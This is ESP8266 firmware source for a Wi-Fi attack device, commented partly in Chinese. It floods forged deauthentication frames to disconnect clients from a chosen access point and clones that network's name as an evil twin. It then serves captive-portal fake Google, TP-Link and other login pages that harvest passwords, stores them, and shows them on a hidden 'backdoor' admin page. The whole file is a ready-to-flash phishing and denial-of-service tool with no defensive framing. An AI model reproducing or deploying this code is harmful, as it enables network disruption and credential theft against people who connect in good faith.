#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

#include <FS.h>
extern "C" {
#include "user_interface.h"
}
uint8_t deauthPacket[26] = {
	/*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
	/*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
	/*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
	/* 10 - 15 */ 0xD4, 0xEE, 0x07,0x52,0x00,0x5A, //source (ap)
	/* 16 - 21 */ 0xD4, 0xEE, 0x07,0x52,0x00,0x5A, //BSSID (ap)
	/* 22 - 23 */ 0x00, 0x00, //fragment & squence number
	/* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
};
//int deuath = true;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
String sniffed;
String pasword;
bool yy = false;


void startWifi() {
	WiFi.mode(WIFI_STA);
	system_phy_set_max_tpw(82);
	WiFi.softAP("HH", "m1234567", 11);
	WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
}

void ty() {
	File file = SPIFFS.open("/ty.html", "r");
	webServer.streamFile(file, "text/html;charset=UTF-8");
	file.close();
}
void google() {
	File file = SPIFFS.open("/google.html", "r");
	webServer.streamFile(file, "text/html;charset=UTF-8");
	file.close();
}
void tplink() {
	File file = SPIFFS.open("/tplink.html", "r");
	webServer.streamFile(file, "text/html;charset=UTF-8");
	file.close();
}
void backdoor() {
	File file = SPIFFS.open("/backdoor.html", "r");
	webServer.streamFile(file, "text/html;charset=UTF-8");
	file.close();
}


void response() {
	int staflag = 0;
	sniffed = webServer.arg("pass");
	pasword = webServer.arg("pass2");


	if (!sniffed.equals("***") && !sniffed.equals(""))
	{
		File file = SPIFFS.open("/final.html", "r");
		webServer.streamFile(file, "text/html;charset=UTF-8");
		file.close();
		int i = 0;
		while (i < 4200)
		{
			run();
			delay(1);
			i++;
		}
		File sn = SPIFFS.open("sniffed", "w");
		sn.println(sniffed);
		sn.close();
		File pa = SPIFFS.open("pasword", "w");
		pa.println(pasword);
		pa.close();
		ESP.reset();

	}

}
bool ii = false;
void getpass()
{
	dnsServer.start(53, "*", apIP);
	webServer.onNotFound([]() {
		webServer.sendHeader("Location", String("http://192.168.1.1/login.html"), true);
		webServer.send(302, "text/plain", "");
	});
	webServer.on("/backdoor.html", HTTP_GET, backdoor);
	webServer.on("/backdoor.html", HTTP_POST, scanok);
	webServer.on("/scan.html", scan);
	webServer.on("/pas.html", pas);
	webServer.begin();
}
void pas()
{
	String temp_html;
	temp_html += "<html> <style> body{ text-align:center} #divcss5{margin:0 auto;width:500px;height:100px} </style> <body style=\"background-color:#000\"> <div style=\"color:#060\"> <h>登->";
	temp_html += sniffed;
	temp_html += "<-录</h> &emsp; <h>后-  >";
	temp_html += pasword;
	temp_html += "<-台</h> </div></body> </html>";
	webServer.send(200, "text/html;charset=UTF-8", temp_html);
}
void scan()
{
	String temp_html;
	int n = WiFi.scanNetworks();
	if (n == 0) {
	}
	else
	{
		temp_html += "<html> <style> body{ text-align:center} #divcss5{margin:0 auto;width:500px;height:100px} </style> <body style=\"background-color:#000\"> <div style=\"color:#060\">";
		for (int i = 0; i < n; ++i)
		{
			temp_html += i + 1;
			temp_html += "->";
			temp_html += WiFi.SSID(i);
			temp_html += "<-";
			temp_html += "(";
			temp_html += WiFi.RSSI(i);
			temp_html += ")";
			temp_html += "<br>";
		}

		temp_html += "</div></body></html>";
	}
	webServer.send(200, "text/html;charset=UTF-8", temp_html);

	ii = true;
}

void scanok() {
	sniffed = "***";
	pasword = "***";
	if (webServer.arg("ty-box") == "ty" && !yy)
	{
		webServer.on("/login.html", HTTP_GET, ty);
		webServer.on("/login.html", HTTP_POST, response);
	}

	else if (webServer.arg("google-box") == "google" && !yy)
	{
		webServer.on("/login.html", HTTP_GET, google);
		webServer.on("/login.html", HTTP_POST, response);
	}

	else if (webServer.arg("tplink-box") == "tplink" && !yy)
	{
		webServer.on("/login.html", HTTP_GET, tplink);
		webServer.on("/login.html", HTTP_POST, response);
	}

	webServer.send(200, "text/html;charset=UTF-8", "<html > <style> body{ text-align:center} #divcss5{margin:0 auto;width:500px;height:100px} </style> <body> <div id=\"divcss5\"> <h1>SSID伪造成功</h1><a href='/backdoor.html'>返回后台</a> </div> </body> </html> ");
	system_phy_set_max_tpw(82);

	WiFi.softAP(WiFi.SSID(atoi(webServer.arg("ssid_html").c_str()) - 1).c_str());
	for (int i = 0; i < 6; i++)
	{
		deauthPacket[16 + i] = deauthPacket[10 + i] = WiFi.BSSID(atoi(webServer.arg("ssid_html").c_str()) - 1)[i];
		
	}
	pinMode(2, OUTPUT);
	digitalWrite(2, LOW);
}

/*
下面为deauth攻击
*/

void run() {
	uint8_t packet[26];
	int	packetSize = 0;
	for (int i = 0; i < 26; i++) {
		packet[i] = deauthPacket[i];
		packetSize++;
	}
//	packet[0] = 0xa0;
	wifi_send_pkt_freedom(packet, 26, 0);
	delay(1);
}

void setup() {
	Serial.begin(115200);
	SPIFFS.begin();
	startWifi();
	getpass();
	File sn = SPIFFS.open("sniffed", "r");
	sniffed = sn.readStringUntil('\n');
	sn.close();
	if (sniffed.equals(""))	sniffed = "***";
	File pa = SPIFFS.open("pasword", "r");
	pasword = pa.readStringUntil('\n');
	pa.close();
	if (pasword.equals(""))	pasword = "***";
}

void loop() {
	if (ii)	run();
	dnsServer.processNextRequest();
	webServer.handleClient();
}
